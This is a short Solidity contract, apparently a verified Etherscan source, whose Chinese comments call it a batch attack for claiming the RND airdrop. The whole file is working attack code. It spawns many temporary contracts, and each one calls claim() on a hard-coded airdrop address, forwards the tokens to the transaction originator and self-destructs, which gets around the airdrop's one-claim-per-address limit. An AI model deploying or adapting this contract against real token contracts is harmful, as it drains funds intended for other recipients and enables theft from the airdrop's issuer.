/**
 *Submitted for verification at Etherscan.io on 2022-02-12
 批量攻击领取RND合约
 logic： 1.自定义接口转账，领取方法
         2.创建临时合约去调用RND的claim方法
         3.领取到代币把代币转回给msg.sender
         4.销毁临时合约
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IAirdrop {
    function transfer(address recipient, uint256 amount) external;
    function claim() external;
}

contract multiCall {
    function call(uint256 times) public {
        for(uint i=0;i<times;++i){
            new claimer();//创建临时合约
        }
    }
}
//临时合约逻辑：
//1.临时合约去领取RND ； 2.临时合约领到的代币往发起调用方转代币 ; 3.销毁临时合约
contract claimer{
    constructor(){
        IAirdrop airdrop = IAirdrop(0x1c7E83f8C581a967940DBfa7984744646AE46b29);
        airdrop.claim();
        airdrop.transfer(address(tx.origin), 151200000000000000000000000);
        selfdestruct(payable(address(msg.sender)));
    }
}